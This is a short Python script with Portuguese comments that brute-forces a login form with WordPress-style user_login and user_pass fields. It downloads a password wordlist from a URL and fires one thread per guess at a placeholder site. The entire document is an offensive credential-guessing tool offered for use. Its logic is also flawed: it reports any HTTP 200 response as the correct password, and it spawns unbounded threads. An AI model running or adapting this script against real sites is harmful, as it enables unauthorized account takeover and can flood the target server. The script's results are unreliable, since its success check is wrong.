
import requests
import threading

# Configurações
url = "SITE"  # substitua pelo URL do seu site
usuario = "USUARIO"
senha_arquivo = "WORDLIST"

# Função para realizar login
def tentar_login(senha):
    dados = {"user_login": usuario, "user_pass": senha}
    resposta = requests.post(url, data=dados)
    if resposta.status_code == 200:
        print(f"Senha correta: {senha}")
        return True
    else:
        print(f"Senha incorreta: {senha}")
        return False

# Função para ler senhas do arquivo
def ler_senhas():
    import requests
    resposta = requests.get(senha_arquivo)
    senhas = resposta.text.splitlines()
    return senhas

# Função principal
def main():
    senhas = ler_senhas()
    threads = []
    for senha in senhas:
        t = threading.Thread(target=tentar_login, args=(senha,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
